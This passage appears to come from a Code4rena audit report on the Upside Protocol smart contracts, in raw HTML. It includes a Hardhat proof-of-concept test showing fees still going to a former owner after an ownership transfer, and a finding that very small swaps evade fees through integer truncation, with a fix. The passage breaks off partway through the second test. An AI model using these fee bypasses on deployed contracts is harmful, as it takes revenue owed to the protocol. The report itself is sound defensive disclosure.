\u003ccode\u003etransferOwnership()\u003c/code\u003e from \u003ccode\u003eOwnable\u003c/code\u003e to check that if the current fee recipient is the owner trying to exit, then it should revert.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003ePoC.test.ts\u003c/code\u003e, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    describe(\u0026quot;C4 PoC Test Suite\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        let user1: HardhatEthersSigner;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       let user2: HardhatEthersSigner;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        before(async function () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            signers = await hhethers.getSigners();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            owner = signers[2];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            user1 = signers[0];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+           user2 = signers[1];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       // the test below goes here\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in the same file:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it(\u0026quot;should send fees to original owner\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const url1 = \u0026quot;https://openzeppelin.com\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const url2 = \u0026quot;https://cantina.com\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const liquidityTokenAddress = await liquidityToken.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenizeFeeDestinationAddress = await owner.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _mintAmount = hhethers.parseUnits(\u0026quot;100\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _feeAmount = hhethers.parseUnits(\u0026quot;5\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Configure fee parameters with current owner as the fee destination\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const newFeeInfo = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeEnabled: true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeStartingBp: 9900,  // 99%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayInterval: 6,  // 6 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeFinalBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDeployerBp: 1000,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeSellBp: 100,       // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Owner sets the fee configuration\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // set tokenize fee to 5e6\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setTokenizeFee(liquidityTokenAddress, _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // mint liquidityToken to user1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.mint(await user1.getAddress(), _mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that user1 received the minted tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // user1 performs tokenization (url1), fee should go to current fee destination (owner)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).tokenize(url1, liquidityTokenAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Validate that the fee was received by the original owner\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let tokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(tokenizeFeeDestinationAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(tokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits(\u0026quot;5\u0026quot;, 6));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Transfer ownership to user2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).transferOwnership(await user2.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // asset that new ownership is assigned to user2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await upsideProtocol.owner()).to.be.eq(await user2.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // user1 performs a second tokenization (url2) after ownership transfer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).tokenize(url2, liquidityTokenAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that the original owner still receives the fee post-ownership transfer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let currentTokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(await owner.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(currentTokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits(\u0026quot;10\u0026quot;, 6));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"03-swap-fee-bypass-via-small-trade-amounts\" style=\"position:relative;\"\u003e\u003ca href=\"#03-swap-fee-bypass-via-small-trade-amounts\" aria-label=\"03 swap fee bypass via small trade amounts permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[03] Swap fee bypass via small trade amounts\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-1\" aria-label=\"finding description 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eswap()\u003c/code\u003e function in the \u003ccode\u003eUpsideProtocol\u003c/code\u003e smart contract is vulnerable to fee circumvention when users initiate swaps with extremely small input amounts. The issue stems from the use of integer division in Solidity, which truncates values. As a result, when the calculated fee amount is less than 1 (due to the small trade size), it truncates to zero, effectively bypassing the protocol’s fee logic.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_isBuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @dev On buy, the dynamic time fee is used\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmountAfterFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis behavior directly undermines the intended fee model, allowing users to perform token swaps without contributing any fee to the protocol. The bypass is particularly problematic given the economic incentives it creates—users could automate micro-swaps to avoid fees entirely while still draining value from the system.\u003c/p\u003e\n\u003ch3 id=\"impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eNo fees are collected on small trade size.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eSet a protocol-wide minimum input amount to reject trades too small to generate fees:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   require(_amount \u0026gt;= MIN_SWAP_AMOUNT, \u0026quot;Swap amount too small\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003ePoC.test.ts\u003c/code\u003e, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Add this import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in \u003ccode\u003ePoC.test.ts\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it(\u0026quot;should implement fee exemption for user1 during swap\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenizeFeeDestinationAddress = await owner.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _mintAmount = hhethers.parseUnits(\u0026quot;100\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set up a initial swap fee configuration\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const newFeeInfo = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeEnabled: true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeStartingBp: 100,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayInterval: 6,  // 6 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeFinalBp: 90,      // 0.9%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDeployerBp: 1000,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeSellBp: 100,       // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set fee info:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await 